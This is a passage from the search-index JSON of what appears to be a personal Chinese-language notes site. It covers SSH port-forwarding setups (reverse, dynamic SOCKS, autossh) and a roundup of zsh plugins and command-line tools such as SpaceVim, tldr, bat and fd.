\u8a2d\u5b9a\u597d\u5f8c\u53ef\u4ee5\u76f4\u63a5\u6253\u4ee5\u4e0b\u6307\u4ee4 ssh -f -N dev # -f : run in background # -N : not execute remote command, useful for forwarding ports \u5c31\u6703\u7b49\u540c\u65bc\u4ee5\u4e0b\u6307\u4ee4 ssh -f -N -R 6666 :127.0.0.1:5555 oalieno@123.45.67.89 # -f : run in background # -N : not execute remote command, useful for forwarding ports","title":"reverse ssh tunnel ( reverse port forwarding )"},{"location":"topics/ssh/#dynamic-port-forwarding","text":"Host dev HostName 123.45.67.89 User oalieno Port 22000 DynamicForward 9999 \u8a2d\u5b9a\u597d\u5f8c\u53ef\u4ee5\u76f4\u63a5\u6253\u4ee5\u4e0b\u6307\u4ee4 ssh -f -N dev # -f : run in background # -N : not execute remote command, useful for forwarding ports \u5c31\u6703\u7b49\u540c\u65bc\u6253\u4ee5\u4e0b\u6307\u4ee4 ssh -f -N -D 9999 oalieno@123.45.67.89 # -f : run in background # -N : not execute remote command, useful for forwarding ports \u4e26\u5728\u96fb\u8166\u4e0a\u8a2d\u5b9a SOCKS \u4ee3\u7406\u4f3a\u670d\u5668 ( 127.0.0.1:9999 ) \u4e4b\u5f8c\u4f60\u53ef\u4ee5\u67e5\u627e\u4f60\u7684 ip \u4f4d\u5740 ( https://www.whatismyip.com/ ) \u6703\u767c\u73fe\u4f60\u5df2\u7d93\u8df3\u53bb 123.45.67.89","title":"dynamic port forwarding"},{"location":"topics/ssh/#autossh","text":"Host dev HostName 123.45.67.89 User oalieno Port 22000 IdentityFile ~/.ssh/id_rsa LocalForward 5555 127.0.0.1:6666 ServerAliveInterval 30 ServerAliveCountMax 3 \u8a2d\u5b9a\u597d\u5f8c\u53ef\u4ee5\u76f4\u63a5\u6253\u4ee5\u4e0b\u6307\u4ee4 autossh -M 0 -f -N dev # -M 0 : autossh echo port, recommend disable it by setting it to 0 # -f : run in background # -N : not execute remote command, useful for forwarding ports \u5c31\u6703\u7b49\u540c\u65bc\u6253\u4ee5\u4e0b\u6307\u4ee4 autossh -M 0 -f -N -o \"ServerAliveInterval 30\" -o \"ServerAliveCountMax 3\" -L 5555 :localhost:6666 oalieno@123.45.67.89 # -M 0 : autossh echo port, recommend disable it by setting it to 0 # -f : run in background # -N : not execute remote command, useful for forwarding ports https://linux.die.net/man/5/ssh_config \u21a9 https://nerderati.com/2011/03/17/simplify-your-life-with-an-ssh-config-file/ \u21a9 https://www.everythingcli.org/ssh-tunnelling-for-fun-and-profit-local-vs-remote/ \u21a9","title":"autossh"},{"location":"topics/tools/","text":"\u53ef\u4ee5\u770b\u770b\u6211\u7684\u8a2d\u5b9a\u6a94 dotfile \uff0c\u6709 install.sh \u53ef\u4ee5\u4e00\u9375\u5b89\u88dd\uff0c\u4f46\u662f\u6709\u4e9b\u90e8\u5206\u53ef\u80fd\u9084\u662f\u8981\u624b\u52d5\u4f86 zsh \u4f7f\u7528 oh my zsh \u6846\u67b6\u7ba1\u7406\u8a2d\u5b9a\u8207\u63d2\u4ef6 \u4f7f\u7528 powerlevel9k \u4e3b\u984c command not found: print_icon locale-gen --lang en_US.UTF-8 \u63d2\u4ef6 \u63d2\u4ef6 \u8aaa\u660e z \u5feb\u901f\u5207\u63db\u8def\u5f91 git \u5404\u7a2e git \u6307\u4ee4\u7e2e\u5beb extract \u4e00\u9375\u89e3\u58d3\u7e2e zsh-nvm \u5e6b\u4f60\u5b89\u88dd\u597d nvm zsh-completions \u6307\u4ee4\u88dc\u9f4a zsh-autosuggestions \u6839\u64da\u6b77\u53f2\u7d00\u9304\u986f\u793a\u53ef\u80fd\u6307\u4ee4 zsh-syntax-highlighting \u5e6b\u4f60\u5224\u65b7\u6307\u4ee4\u6587\u6cd5\u4e26\u4e0a\u8272 SpaceVim \u5e6b\u4f60\u88dd\u597d\u5404\u7a2e\u63d2\u4ef6\u7684 vim SpaceVim \u7528\u5728 neovim \u4e0a\u6bd4\u8f03\u6c92\u6709\u554f\u984c\uff0c\u6240\u4ee5\u53ef\u4ee5\u5148\u88dd\u500b neovim look: /usr/share/dict/words: no such file or directory sudo apt-get install wamerican thefuck \u5e6b\u4f60\u66f4\u6b63\u4f60\u6253\u932f\u7684\u6307\u4ee4 tldr \u7c21\u55ae\u660e\u77ad\u7528\u4f8b\u5b50\u4f86\u8aaa\u660e\u7684 man page lolcat \u5c31\u662f\u5f69\u8272\u7684 cat \uff0c\u6c92\u6709\u4ec0\u9ebc\u5be6\u969b\u7528\u9014 xD bat \u66f4\u597d\u770b\u7684 cat ncdu \u66f4\u597d\u770b\u7684 du fd \u66f4\u597d\u770b\u7684 find https://zcheng.ren/2018/07/27/spacevimtutorial/ \u21a9 https://hufangyun.com/2017/zsh-plugin/ \u21a9 https://remysharp.com/2018/08/23/cli-improved/ \u21a9","title":"\u5de5\u5177\u6574\u7406 - \u4e00\u79d2\u8b8a\u6642\u5c1a"},{"location":"topics/tools/#zsh","text":"\u4f7f\u7528 oh my zsh \u6846\u67b6\u7ba1\u7406\u8a2d\u5b9a\u8207\u63d2\u4ef6 \u4f7f\u7528 powerlevel9k \u4e3b\u984c command not found: print_icon locale-gen --lang en_US.UTF-8","title":"zsh"},{"location":"topics/tools/#_1","text":"\u63d2\u4ef6 \u8aaa\u660e z \u5feb\u901f\u5207\u63db\u8def\u5f91 git \u5404\u7a2e git \u6307\u4ee4\u7e2e\u5beb extract \u4e00\u9375\u89e3\u58d3\u7e2e zsh-nvm \u5e6b\u4f60\u5b89\u88dd\u597d nvm zsh-completions \u6307\u4ee4\u88dc\u9f4a zsh-autosuggestions \u6839\u64da\u6b77\u53f2\u7d00\u9304\u986f\u793a\u53ef\u80fd\u6307\u4ee4 zsh-syntax-highlighting \u5e6b\u4f60\u5224\u65b7\u6307\u4ee4\u6587\u6cd5\u4e26\u4e0a\u8272","title":"\u63d2\u4ef6"},{"location":"topics/tools/#spacevim","text":"\u5e6b\u4f60\u88dd\u597d\u5404\u7a2e\u63d2\u4ef6\u7684 vim SpaceVim \u7528\u5728 neovim \u4e0a\u6bd4\u8f03\u6c92\u6709\u554f\u984c\uff0c\u6240\u4ee5\u53ef\u4ee5\u5148\u88dd\u500b neovim look: /usr/share/dict/words: no such file or directory sudo apt-get install wamerican","title":"SpaceVim"},{"location":"topics/tools/#thefuck","text":"\u5e6b\u4f60\u66f4\u6b63\u4f60\u6253\u932f\u7684\u6307\u4ee4","title":"thefuck"},{"location":"topics/tools/#tldr","text":"\u7c21\u55ae\u660e\u77ad\u7528\u4f8b\u5b50\u4f86\u8aaa\u660e\u7684 man page","title":"tldr"},{"location":"topics/tools/#lolcat","text":"\u5c31\u662f\u5f69\u8272\u7684 cat \uff0c\u6c92\u6709\u4ec0\u9ebc\u5be6\u969b\u7528\u9014 xD","title":"lolcat"},{"location":"topics/tools/#bat","text":"\u66f4\u597d\u770b\u7684 cat","title":"bat"},{"location":"topics/tools/#ncdu","text":"\u66f4\u597d\u770b\u7684 du","title":"ncdu"},{"location":"topics/tools/#fd","text":"\u66f4\u597d\u770b\u7684 find https://zcheng.ren/2018/07/27/spacevimtutorial/ \u21a9 https://hufangyun.com/2017/zsh-plugin/ \u21a9 https://remysharp.com/2018/08/23/cli-improved/ \u21a9","title":"fd"}]}